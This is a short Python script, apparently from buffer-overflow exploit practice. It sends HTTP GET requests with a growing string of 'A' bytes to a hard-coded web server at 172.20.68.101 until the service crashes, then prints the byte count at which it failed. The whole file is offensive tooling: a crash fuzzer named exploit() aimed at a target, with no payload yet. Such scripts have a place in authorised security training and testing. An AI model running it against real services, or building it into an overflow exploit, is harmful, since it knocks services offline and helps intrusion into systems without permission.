#!/usr/bin/python3

import socket
import struct
import sys 

# Variables

ip = "172.20.68.101"
port = 80

def exploit():

    lenght = 200

    while True:
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(7)
            s.connect((ip, port))

            print("[+] Sending %d bytes" % lenght)

            s.send(b"GET " + b"\x41"*lenght + b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()

            lenght += 200

        except:

            print("[!] The service maybe broken or corrupted.")
            print("[!] Crashed at %d bytes" % lenght)
            sys.exit(1)

if __name__ == '__main__':
    exploit()

